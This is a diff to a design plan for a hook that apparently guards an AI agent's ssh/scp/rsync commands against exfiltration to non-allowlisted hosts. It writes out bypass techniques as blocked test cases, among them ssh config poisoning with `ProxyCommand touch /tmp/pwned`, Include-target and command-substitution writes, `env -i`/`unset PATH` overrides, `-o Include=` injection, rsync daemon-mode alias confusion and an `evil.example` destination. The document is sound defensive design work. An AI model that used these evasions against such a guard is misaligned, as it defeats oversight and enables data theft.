@@ -291,7 +291,17 @@ Behaviour, in order:
    `-o` values); the routing and command-executing `-o` forms are already
    refused before resolution, so they never reach this call.
 5. **Parse** the `key value` lines of the output (ssh prints keys lowercased,
-   one per line). Read `hostname`, `proxyjump`, `proxycommand`.
+   one per line) and **validate the schema strictly**. Read `hostname`,
+   `proxyjump`, `proxycommand`. A successful `ssh -G` prints exactly one
+   `hostname` line; a zero-exit output that is **missing** the `hostname` line,
+   or carries a **duplicate** or **malformed** `hostname`/`proxyjump`/
+   `proxycommand`, or that the parser otherwise cannot classify, is **not** a
+   trustworthy resolution and **blocks**. It is not treated as a resolution
+   failure that falls back to the literal match: literal fallback (step 4) is
+   reserved for the launch-failure and non-zero-exit cases, where the resolver
+   got *no* answer at all. A zero-exit answer the resolver cannot trust fails
+   closed, because returning `[token]` on a malformed answer would clear an
+   allowlisted literal that the resolver never actually resolved.
 6. **ProxyCommand from the resolved config.** If `proxycommand` is present and
    not `none`, the session is routed through an arbitrary command whose
    destination cannot be verified — raise a block, exactly as the existing
@@ -374,17 +384,20 @@ reconstructed from the prose.
 
 | Condition | Outcome | Where |
 | --- | --- | --- |
-| `HOME`/`PATH` set for the command — leading, earlier on the line, or via `source`/`.` (incl. `env -i`/`-u`) | **Block** | Step 1 |
+| `HOME`/`PATH` set or unset for the command — leading, earlier on the line, or via `source`/`.` (incl. `env -i`/`-u`, `unset HOME`/`PATH`) | **Block** | Step 1 |
 | Command-executing `-o` (`ProxyCommand`/`ProxyJump`/`LocalCommand`/`PermitLocalCommand`/`KnownHostsCommand`), `scp -S`, rsync transport flags | **Block** (before resolution) | Faithful resolution |
+| Config-source `-o` key (`Include`) that adds an unscanned config file | **Block** (before resolution) | Faithful resolution |
 | Command-executing directive detected in a readable config | **Block** | Step 3 |
 | Reachable config present but unreadable/unparseable, or an un-followable / token / `${ENV}` / over-depth `Include` | **Block** | Step 3 |
-| Config chain written earlier on the same line (TOCTOU) | **Block** | Config-chain modification |
+| Config chain written earlier on the same line — incl. an absolute-`Include` target and a config-writing command substitution (TOCTOU) | **Block** | Config-chain modification |
 | `getpwuid(getuid())` unresolvable, or a relative `-F`/config path with unknown cwd | **Block** | Steps 3-4 (`require_cwd`) |
+| `ssh -G` zero-exit but output missing/duplicate/malformed `hostname`/`proxyjump`/`proxycommand` | **Block** | Step 5 |
 | Resolved `hostname` not allowlisted, resolved `proxycommand` ≠ `none`, or a resolved `proxyjump` hop not allowlisted | **Block** | Steps 6-7 |
 | ProxyJump depth cap, invocation cap, or cycle exhausted | **Block** | Step 7 |
 | `argv[0]` path-qualified, or the resolver's `ssh` absent / outside `SYSTEM_PREFIXES` | **Literal fallback** | Step 2 |
 | `ssh -G` fails — `OSError`/`SubprocessError`/timeout/non-zero exit | **Literal fallback** | Step 4 |
 | Config chain genuinely absent (no user/system config, no `-F`, `Include` glob matches nothing) | **Literal fallback** | Step 3 |
+| rsync daemon-mode (`host::module`) or `rsync://` destination (no ssh) | **Literal fallback** (never resolved) | Faithful resolution |
 
 "Literal fallback" is not an allow: it hands the original token to `_require_lab`,
 which still blocks a non-allowlisted literal. It is permissive only in the sense
@@ -414,7 +427,18 @@ the *remote*, …) do not affect local binary or config selection and are left a
 `env -i` / `env -u PATH` / `env -u HOME` wrapper forms clear or unset those
 variables without an assignment, changing which binary or config applies just as an
 assignment would, so the dispatcher treats those `env` flag forms as overrides too
-(block), not only the `VAR=value` forms `unwrap_with_env` captures.
+(block), not only the `VAR=value` forms `unwrap_with_env` captures. This needs an
+explicit extension of the wrapper contract, because today the stripping loses the
+signal: `_env_option_end` skips `env -i` as an ordinary flag and consumes the
+variable after `env -u` (so `env -u PATH ssh …` hands back `ssh …` with an empty
+`env`), and neither fact reaches `_check_ssh_family`. So `unwrap_with_env` /
+`_env_option_end` must surface an override marker the resolver's step-1 gate reads
+whenever the `env` wrapper carries `-i` / `--ignore-environment`, or a `-u` /
+`--unset` of `HOME` or `PATH` — in every spelling `_env_option_end` already parses
+(separate, attached, `=`-joined, and long-prefix). The marker rides alongside `env`
+on the `BashContext`, and step 1 blocks on it exactly as on an assigned
+`HOME`/`PATH`. Regression tests cover `env -i ssh amd-halo`, `env -u PATH ssh
+amd-halo` and `env -u HOME ssh amd-halo` (all blocked).
 
 ### Preceding HOME/PATH assignments (review follow-up)
 
@@ -443,8 +467,14 @@ effective directory through a `cd` (including restoring it when a `( … )`
 subshell closes), and carry them on the `BashContext` handed to
 `_check_simple_command` (as `ctx.at(cwd)` carries the directory today). A
 preceding simple command whose assignment prefix, or whose `export`/`declare
--x`/`typeset -x` operands, name `HOME` or `PATH` adds that name; `unset`/`export
--n` need not remove one (keeping a name is the fail-closed direction). When
+-x`/`typeset -x` operands, name `HOME` or `PATH` adds that name. An `unset HOME`/
+`unset PATH` (and `export -n HOME`/`export -n PATH`) **also adds** the name:
+clearing the variable changes the command environment the real ssh inherits and
+the shell's own command lookup (an unset `PATH` makes the shell search a built-in
+default path), while the resolver still runs under the hook's `PATH`/`HOME`, so a
+clear is an override in exactly the way an assignment is. Removing a name from the
+set is never required — keeping it is the fail-closed direction — so neither
+`unset` nor `export -n` ever *clears* a tracked name; they only ever add. When
 `HOME` or `PATH` is in that set at an ssh-family command, step 1 blocks, exactly
 as for a leading assignment. A substitution body, which is analysed after the
 list, is analysed with the set treated as "unknown", i.e. as if both were set —
@@ -481,17 +511,41 @@ honours the injected directive. This defeats step 3's stated guarantee that no
 Decision: a write to the reachable config chain earlier on the same line
 poisons the scan, so it fails closed. Tracked the same way as the `cd` and the
 assignment/export set — one Bash tool call, carried on `BashContext` — the
-dispatcher marks the config chain "possibly modified" when an earlier simple
-command on the line could write into it: a redirection (`>`/`>>`) whose target,
-or a `cp`/`mv`/`tee`/`install`/`dd of=` destination, resolves (in
-`ctx.command_cwd`, expanding `~` via the passwd home) under `~/.ssh`, to
-`/etc/ssh/ssh_config`, or to a `-F` path the ssh command will name. When the
-mark is set — or when a write target cannot be determined (an unparsed
-redirection, a variable path) — the ssh-family command blocks rather than
-scanning or resolving. This is conservative: it refuses the rare
-`write-config; ssh` one-liner rather than trusting a scan the same line can
-invalidate. A regression test exercises `printf … > ~/.ssh/config; ssh
-amd-halo` (blocked). Residual limits are noted in Open questions.
+dispatcher marks the config chain "possibly modified" when an earlier command on
+the line could write into it: a redirection (`>`/`>>`) whose target, or a
+`cp`/`mv`/`tee`/`install`/`dd of=` destination, resolves (in `ctx.command_cwd`,
+expanding `~` via the passwd home) to a path **in the reachable config chain**.
+That chain is the *full* set the static scan resolves, **not only** the three
+default locations: besides `~/.ssh/config`, `/etc/ssh/ssh_config` and a named
+`-F` path, it includes every file reached through an `Include` directive,
+**wherever it points**. An absolute `Include /tmp/extra.conf` makes
+`/tmp/extra.conf` part of the chain, so `printf 'ProxyCommand …' > /tmp/extra.conf;
+ssh -F /tmp/base.conf amd-halo` must poison the scan too. A write to a path the
+scan has not yet established as part of the chain, but that an `Include` *pattern*
+already read could later match (an `Include /tmp/*.conf` with a write that creates
+`/tmp/new.conf`), is also a possible modification: the poison set is every path
+the scanned `Include` directives name or glob, **including currently-absent
+targets**. When the mark is set — or when a write target cannot be determined (an
+unparsed redirection, a variable path) — the ssh-family command blocks rather than
+scanning or resolving.
+
+**A command substitution is evaluated for the same poison, before the ssh check.**
+A substitution body runs before the command that contains it, yet the dispatcher
+analyses it after the simple-command list, so `: "$(printf 'ProxyCommand …' >
+~/.ssh/config)"; ssh amd-halo` would otherwise scan the old config before the
+substitution is visited. The config-chain-modified mark is therefore set from a
+substitution body that could write into the chain exactly as from a plain command;
+and — matching the "unknown ⇒ as if set" rule already used for the `HOME`/`PATH`
+set and the `ctx.at(None)` cwd rule — any substitution earlier on a line that then
+runs an ssh-family command, whose write target cannot be *proven* outside the
+chain, poisons the scan (block).
+
+This is conservative: it refuses the rare `write-config; ssh` one-liner rather than
+trusting a scan the same line can invalidate. Regression tests exercise both
+`printf … > ~/.ssh/config; ssh amd-halo`, the absolute-`Include`-target write, and
+the command-substitution form (all blocked, no sentinel). Residual limits — a
+*concurrent* writer that races the scan and the `ssh -G` reread, which single-line
+analysis cannot see — are noted in Open questions.
 
 ### Faithful resolution and its options (thread #1 — the exact forwarding contract)
 
@@ -515,6 +569,19 @@ those normalised pairs:
   amd-halo` hole (the guard would resolve `amd-halo` while the real ssh connects to
   `evil.example`). Forwarding a non-routing `-o` to `ssh -G` can only change the
   *reported* effective config, which is precisely what the guard must see.
+
+  **Exception — a config-source-adding `-o` key is refused, not forwarded.** The
+  "can only change the reported config" argument holds for host/config-*selecting*
+  keys; it fails for a key that adds a configuration-file *source* `ssh -G` would
+  read but the static scan (step 3) never inspected — forwarding that would
+  reintroduce the `Match exec`/command-directive gap through a file the scan could
+  not see. The config-source keyword is `Include`. Current OpenSSH rejects
+  `Include` supplied as a command-line `-o` ("Include directive not supported as a
+  command-line option"), so such a command already fails before the guard; but the
+  resolver refuses an `-o Include=…` (case-insensitive, both spellings) before
+  resolution regardless, so the contract does not rely on that OpenSSH behaviour,
+  and any future file-adding `-o` key joins this refused set. A refused
+  config-source `-o` blocks, like a routing `-o`.
 
 **Rejected before resolution (raise a block; never forwarded) — case-insensitive,
 both spellings:**
@@ -562,6 +629,22 @@ affect which host `ssh -G` reports.
   resolver runs `ssh -G <host>` with **no** forwarded options for an rsync
   destination; `rsync -F src amd-halo-ci:dst` must not become
   `ssh -G -F src amd-halo-ci`.
+
+  **Daemon-mode (`::`) rsync destinations are never resolved.** `_REMOTE_SPEC`
+  matches one *or two* colons (`::?`), so it captures the remote-shell
+  `host:path` and the rsync-daemon `host::module` forms with the same host
+  group, and `rsync://` is handled as a URL. Daemon mode does **not** start ssh
+  and does not read ssh config, so alias resolution must not apply to it:
+  resolving `evil-alias::module` through `ssh -G` could report an allowlisted
+  `hostname` while rsync connects to the literal daemon host `evil-alias`,
+  turning resolution into a bypass. The resolve-then-require pass therefore sends
+  only **remote-shell** rsync destinations (a single colon, and not an `rsync://`
+  URL) through `_resolve_ssh_destination`; a `::` or `rsync://` destination keeps
+  today's literal match against the token's own host. The rsync parser must
+  record which colon form matched (the current single capture group does not), so
+  the pass can tell a daemon destination from a remote-shell one; a regression
+  case covers `rsync src amd-halo-ci::module` being literal-matched, not
+  resolved.
 
 **Prerequisite: rsync's destinations must be parsed with rsync's own option
 table.** Because `_SSH_VALUE_FLAGS` is applied to rsync, the token after any of
@@ -634,7 +717,26 @@ function, as `exfil_bash_dispatch.shutil_which` already is) so a test can add th
 fixture directory for its duration. One test must leave the seam alone and prove
 the converse: a fake `ssh` placed first on `PATH` outside the trusted prefixes is
 **not executed** (its sentinel file is never created) and the literal match
-decides. A new sibling module is used rather
+decides.
+
+**The config roots need their own seam too.** The fake `ssh` alone cannot drive
+the success path: the resolver scans the passwd-home `~/.ssh/config` and
+`/etc/ssh/ssh_config` *before* it runs `ssh -G`, and when that chain is absent it
+takes the literal fallback and never invokes the fake binary — so an
+alias-to-allowlisted or config-scan test would neither reach resolution
+deterministically nor be isolated from the CI runner's real SSH configuration.
+`GuardFixture` builds a temp repository, not the user's passwd-home config, and
+`HOME` cannot be redirected to a fixture (step 1 refuses a `HOME` override and
+step 3 reads the passwd home, not `$HOME`). So the resolver must read its config
+roots — the passwd-home base that `~` expands to, and the system-config path —
+through module-level names (as it locates `ssh` through one module-level
+function), and the fixture points **both** at an isolated config tree for the
+test's duration, writing the alias's `~/.ssh/config`, any `-F` file, and an empty
+system-config file there. The tests then assert on a fully controlled config
+chain — the system config is explicitly neutralised (an empty fixture file),
+never the runner's — and the resolution path runs deterministically.
+
+A new sibling module is used rather
 than extending `test_exfiltration_guard_check.py`, which is already 1591 lines
 against the 1600-line hard limit; the existing `test_exfiltration_guard_transport.py`
 establishes the sibling-module-on-shared-`GuardFixture` pattern, and CI already
@@ -686,7 +788,19 @@ A reviewer confirms the task is done when:
 - A write to the reachable config chain earlier on the same line **blocks** the
   ssh-family command: `printf 'ProxyCommand touch /tmp/pwned\n' > ~/.ssh/config;
   ssh amd-halo` is refused and no sentinel is created, because the pre-execution
-  scan cannot vouch for a file a preceding command rewrites.
+  scan cannot vouch for a file a preceding command rewrites. A write to an
+  **absolute `Include` target** blocks the same way (`printf 'ProxyCommand …' >
+  /tmp/extra.conf; ssh -F /tmp/base.conf amd-halo`, where `/tmp/base.conf`
+  includes `/tmp/extra.conf`), and so does a config-writing **command
+  substitution** earlier on the line (`: "$(printf 'ProxyCommand …' >
+  ~/.ssh/config)"; ssh amd-halo`).
+- A config-source `-o` is **rejected before resolution**: `ssh -o Include=/tmp/x
+  amd-halo` (and the attached `-oInclude=…`, case-insensitively) is **blocked**,
+  so no `ssh -G` reads a file the static scan never inspected.
+- A zero-exit `ssh -G` whose output is **malformed or incomplete** (the fake ssh
+  prints no `hostname` line, or a duplicate/garbled one) **blocks** — it is not
+  treated as a resolution failure, so an allowlisted literal (`ssh amd-halo`) is
+  **not** cleared by a result the resolver could not trust.
 - A `-J` jump-host **alias** resolves before the allowlist match: `ssh -J amd-halo-ci
   amd-halo`, where `amd-halo-ci` resolves to the allowlisted `amd-halo`, is
   **allowed** (on the base branch the immediate per-hop `_require_lab` rejects the
@@ -713,7 +827,11 @@ A reviewer confirms the task is done when:
   (plain assignment, not exported), and `source env.sh; ssh amd-halo` /
   `. env.sh; ssh amd-halo` (sourced — `HOME`/`PATH` treated as unknown, so
   blocked) are all **blocked**, while `export PATH=$PATH:/x; ls` (no ssh on the
-  line) and `export EDITOR=vim; ssh amd-halo` are unaffected.
+  line) and `export EDITOR=vim; ssh amd-halo` are unaffected. An `unset PATH; ssh
+  amd-halo` and `unset HOME; ssh amd-halo` are **blocked** too (clearing the
+  variable is an override), and the `env` wrapper forms `env -i ssh amd-halo`,
+  `env -u PATH ssh amd-halo` and `env -u HOME ssh amd-halo` are **blocked** via
+  the override marker the wrapper surfaces.
 - A path-qualified ssh executable is **not run by the resolver**: with a sentinel
   script at `/tmp/ssh`, `/tmp/ssh amd-halo-ci` falls back to the literal match
   (blocked, alias not allowlisted) and the sentinel is never created; likewise a
@@ -727,6 +845,12 @@ A reviewer confirms the task is done when:
 - rsync forwards nothing: `rsync -F src/ amd-halo-ci:dst/` resolves `amd-halo-ci`
   with no `-F` passed to `ssh -G` (allowed when it maps to `amd-halo`), and the
   prerequisite parser fix makes `rsync src -o evil.example:/tmp/` **blocked**.
+- An rsync **daemon-mode** destination is literal-matched, never resolved:
+  `rsync src amd-halo-ci::module`, where `amd-halo-ci` would resolve to the
+  allowlisted `amd-halo` under ssh config, is matched against the literal
+  `amd-halo-ci` (blocked, alias not allowlisted) and `ssh -G` is never run,
+  because daemon mode does not use ssh; the same holds for an `rsync://` URL
+  destination.
 - The same cases hold for `scp`/`rsync`-over-ssh destinations.
 - The existing ssh/scp/rsync tests in every existing `test_exfiltration_guard_*.py`
   module (`_check`, `_transport`, `_interpreter`, `_worktree`, `_pinning`) still
@@ -987,6 +1111,26 @@ should decide deliberately.
    block-on-exhaustion policy, or the per-program forwarding rules. The plan is the
    authoritative contract; the task description should be refreshed when the plan
    is approved.
+6. **A residual race the single-line scan cannot close.** The static scan
+   (step 3) and the separate `ssh -G` subprocess (step 4) read the config chain
+   at two different instants. The "Config-chain modification earlier on the line"
+   rule closes the *same-line* write — a preceding command or substitution that
+   rewrites the chain — but it cannot see a write that races from outside the
+   analysed line: a background process started earlier (`sleep 0; evil &`), a
+   concurrent Bash tool call, or a symlink/file replacement swapped in between the
+   scan and the `ssh -G` reread. In that window a chain the scan proved clean can
+   gain a `Match exec`/`ProxyCommand` that the real `ssh -G` then honours. This is
+   a narrow window (the two reads are milliseconds apart and the attacker must win
+   a race inside one hook invocation), and it is no worse than the base branch,
+   which runs no `ssh -G` at all — but it is the one path where the "`ssh -G` only
+   on a proven-clean config" guarantee is probabilistic rather than absolute. The
+   fail-closed closure is to make `ssh -G` read an **isolated snapshot**: copy the
+   scanned config chain to a private temp tree and run `ssh -G -F <snapshot>`
+   against it, so the file `ssh -G` evaluates is byte-for-byte the file the scan
+   cleared and cannot be swapped underneath it. The approver should decide whether
+   to require the snapshot now or accept the residual race as a documented limit
+   (the snapshot adds per-resolution copy cost and must reproduce OpenSSH's
+   include/relative-path resolution into the snapshot tree, which is non-trivial).
 
 ## Estimated complexity
 
